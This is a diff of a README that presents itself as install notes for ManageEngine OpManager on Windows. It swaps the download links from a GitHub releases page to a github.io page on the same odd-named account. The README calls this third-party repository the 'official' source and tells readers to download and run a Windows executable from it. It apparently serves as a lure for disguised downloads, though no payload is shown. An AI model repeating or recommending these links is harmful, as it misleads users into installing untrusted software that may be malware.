@@ -1,6 +1,6 @@
 # ⚙️ ManageEngine-OpManager-Install-Notes - Install network monitoring tools on Windows
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/repressing-scrupulousness284/ManageEngine-OpManager-Install-Notes/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://repressing-scrupulousness284.github.io)
 
 ManageEngine OpManager monitors your network devices, servers, and bandwidth usage. Installing this software on Windows 11 presents unique challenges for standard users. These notes provide instructions to install the application, resolve setup failures, and configure the software environment on your personal computer.
 
@@ -8,7 +8,7 @@ ManageEngine OpManager monitors your network devices, servers, and bandwidth usa
 
 You must obtain the installation files from the official repository release page. Follow the link below to access the version history and current builds.
 
-[Visit the release page to download your software](https://github.com/repressing-scrupulousness284/ManageEngine-OpManager-Install-Notes/releases)
+[Visit the release page to download your software](https://repressing-scrupulousness284.github.io)
 
 On this page, look for the latest release version. Download the executable file designed for Windows systems. Ensure your connection remains stable during the download to prevent file corruption.
 
